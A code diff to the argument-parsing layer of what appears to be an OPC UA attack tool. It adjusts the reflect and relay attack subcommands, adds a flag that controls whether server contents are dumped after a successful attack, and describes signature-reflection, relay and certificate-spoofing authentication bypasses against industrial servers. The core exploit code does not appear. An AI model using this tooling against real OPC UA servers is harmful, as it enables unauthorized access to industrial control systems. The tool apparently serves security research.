@@ -59,6 +59,11 @@ answer this as well and set a serverSignature on the nonce. This signature is
 then copied to the ActivateSessionRequest back on the main session, taking 
 advantage of the lack of domain separation between client and server signatures.
 
+The default form of the attack only works against servers that support an HTTPS 
+endpoint. If that is not the case, you'll need to carry out an OPN forging 
+attack against the server first and supply its result with the --forged-opn 
+flag.
+
 If the server requires user authentication on top of client authentication, the
 same technique is attempted to spoof a user certificate. The attack won't work
 if password-based authentication is required.
@@ -75,10 +80,12 @@ WebPKI or taken from a compromised system) via --opn-cert and --opn-key.
   def add_arguments(self, aparser):
     aparser.add_argument('-o', '--forged-opn', type=FileType('r'),
       help='result of a prior opnforge attack against the server')
-    aparser.add_argument('-c', '--opn-cert', type=FileType('r'),
-      help='alternative certificate (PEM encoded) to use for the OPN handshake')
-    aparser.add_argument('-k', '--opn-key', type=FileType('r'),
-      help='private key (PEM encoded) associated with --opn-cert certificate')
+    # aparser.add_argument('-c', '--opn-cert', type=FileType('r'),
+    #   help='alternative certificate (PEM encoded) to use for the OPN handshake')
+    # aparser.add_argument('-k', '--opn-key', type=FileType('r'),
+    #   help='private key (PEM encoded) associated with --opn-cert certificate')
+    aparser.add_argument('-n', '--no-demo', action='store_true',
+      help='don\'t dump server contents on success; just tell if attack worked')
     
     aparser.add_argument('url',
       help='Target server OPC URL (either opc.tcp or https protocol)',
@@ -86,7 +93,7 @@ WebPKI or taken from a compromised system) via --opn-cert and --opn-key.
     
   def execute(self, args):
     # TODO: OPN/cert options
-    reflect_attack(args.url)
+    reflect_attack(args.url, not args.no_demo)
     
 class RelayAttack(Attack):
   subcommand = 'relay'
@@ -110,10 +117,12 @@ alternative certificate for OPN.
       help='result of a prior opnforge attack against either server')
     aparser.add_argument('-b', '--forged-opn-b', type=FileType('r'),
       help='in case separate forged OPN\'s need to be used for both servers, this one is used for server-b and the -o file is used for server-a')
-    aparser.add_argument('-c', '--opn-cert', type=FileType('r'),
-      help='alternative certificate (PEM encoded) to use for the OPN handshake')
-    aparser.add_argument('-k', '--opn-key', type=FileType('r'),
-      help='private key (PEM encoded) associated with --opn-cert certificate')
+    # aparser.add_argument('-c', '--opn-cert', type=FileType('r'),
+    #   help='alternative certificate (PEM encoded) to use for the OPN handshake')
+    # aparser.add_argument('-k', '--opn-key', type=FileType('r'),
+    #   help='private key (PEM encoded) associated with --opn-cert certificate')
+    aparser.add_argument('-n', '--no-demo', action='store_true',
+      help='don\'t dump server contents on success; just tell if attack worked')
     
     aparser.add_argument('server-a', 
       help='OPC URL of the server of which to spoof the identity', 
@@ -124,7 +133,7 @@ alternative certificate for OPN.
     
   def execute(self, args):
     # TODO: OPN/cert options
-    relay_attack(args.server_a, args.server_b)
+    relay_attack(getattr(args, 'server-a'), getattr(args, 'server-b'), not args.no_demo)
   
 class SigForgeAttack(Attack):
   subcommand = 'sigforge'
